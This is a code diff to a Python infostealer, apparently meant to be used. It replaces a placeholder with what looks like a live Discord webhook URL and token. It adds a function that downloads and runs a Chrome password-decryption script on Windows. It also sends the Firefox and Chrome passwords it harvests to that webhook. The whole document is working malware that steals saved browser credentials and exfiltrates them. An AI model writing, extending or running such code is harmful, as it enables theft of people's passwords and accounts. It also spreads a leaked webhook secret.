@@ -9,7 +9,7 @@ import os
 import sys
 from discord import SyncWebhook
 
-web_hook = 'your_webhook_:)'
+web_hook = 'https://discordapp.com/api/webhooks/1312086556802023455/rPgQAVxK6xgh3OYDXi-14ZrS7ML_MONoBLxRB49zKsamBleek9RuODUXbUSd8hMTRIED'
 username = None
 chrome_path = None
 firefox_path = None
@@ -17,7 +17,7 @@ firefox_path = None
 def check_os():
     global username
     global firefox_path
-    #global chrome_path
+    global chrome_path
 
     if os.name == "nt":
         username = os.environ['USERPROFILE']
@@ -51,7 +51,7 @@ def get_firefox_profiles():
         return None
 
 def get_firefox_passwords(profile):
-    r = requests.get("http://ATTACKER_URL/firefox_decrypt.py")
+    r = requests.get("http://127.0.0.1/firefox_decrypt.py")
     temp_dir = tempfile.mkdtemp()
     os.chdir(temp_dir)
 
@@ -63,6 +63,22 @@ def get_firefox_passwords(profile):
     passwords = run_command(command)
 
     os.remove("firefox_decrypt.py")
+
+    return passwords
+
+def get_chrome_passwords():
+    r = requests.get("http://127.0.0.1/chrome_decrypt_passwords.py")
+    temp_dir = tempfile.mkdtemp()
+    os.chdir(temp_dir)
+
+    with open("chrome_decrypt_passwords.py","wb") as f:
+        f.write(r.content)
+
+    command = f"python chrome_decrypt_passwords.py"
+
+    passwords = run_command(command)
+
+    os.remove("chrome_decrypt_passwords.py")
 
     return passwords
 
@@ -79,4 +95,10 @@ if __name__ == '__main__':
         if passwords:
             send_discord(passwords)
         else:
-            print("Passwords not found")
+            print("Firefox passwords not found")
+
+    if os.name == "nt":
+        chrome_passwords = get_chrome_passwords() 
+
+        if chrome_passwords:
+            send_discord(chrome_passwords)
